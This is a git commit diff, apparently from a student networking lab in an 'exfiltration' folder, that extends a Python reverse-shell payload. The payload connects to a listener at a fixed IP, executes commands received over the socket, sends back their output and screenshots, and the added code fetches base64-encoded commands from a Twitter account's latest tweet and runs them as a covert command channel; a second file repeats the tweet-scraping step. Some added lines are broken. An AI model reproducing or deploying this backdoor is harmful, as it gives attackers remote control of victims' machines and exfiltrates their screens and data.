b84f67e29d318965495a02df2fc4d72a9515c44d
unknown <Administrateur@105SE49-3RVVV22.ad.campus-eni.fr>
2019-12-20 09:42:10 +0100

    web

--- reseauTP/exfiltration/payload.py
+++ reseauTP/exfiltration/payload.py
@@ -2,12 +2,22 @@ import socket
 import subprocess
 from mss import mss 
 import base64
+import requests 
+from bs4 import BeautifulSoup as soup  
+import time
+
+
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(('192.168.1.134', 4000))
 
 data = ""
+
+def shell(data): 
+    process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+    out = process.stdout.read() + process.stderr.read()
+    s.send(out)
 
 def screen():
     with mss() as sct:
@@ -19,11 +29,23 @@ while data != "exit":
         screen()
         with open("test.png", "rb") as img_file:
              s.send(img_file.read())
+
+    elif str(data) == "twitter":
+
+
+        url = "https://twitter.com/S1mpleCC"
+        data = requests.get(url)
+        data = soup(data.text,"html.parser")
+        cmd = data.find('div', {'class':'tweet'}).find('p', {'class': 'tweet-text'}).string
+        timeTweet = data.find('div', {'class':'tweet'}).find('data-time-ms').string
+        
+        cmd = str(base64.b64decode(cmd), 'utf-8')
+
+        ts = time.time()
+        shell(cmd)
     else:
         data = s.recv(1024).decode()
-        print(data)
-        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-        out = process.stdout.read() + process.stderr.read()
-        s.send(out) 
+        shell(data)
+       
 s.close()
 
--- web/requete.py
+++ web/requete.py
@@ -1,9 +1,21 @@
 import requests 
-from bs4 import BeautifulSoup as soup   
+from bs4 import BeautifulSoup as soup  
+import base64 
 
-url = "https://www.leboncoin.fr/"
+""" url = "https://bastien-ltn.fr/cmd/"
 data = requests.get(url)
 
 data2 = soup(data.text,"html.parser")
-print(data2)
-print(type(data2))
+
+cmd = data2.find('div', {"class": "entry-content"}).find("p").string
+
+cmd = str(base64.b64decode(cmd), 'utf-8') """
+
+
+url = "https://twitter.com/S1mpleCC"
+data = requests.get(url)
+data = soup(data.text,"html.parser")
+cmd = data.find('div', {'class':'tweet'}).find('p', {'class': 'tweet-text'}).string
+#timeTweet = data.find('div', {'class':'tweet'}).find('span', {'class':'_timestamp'}).attrs.get.('data-time-ms')
+
+print(timeTweet)
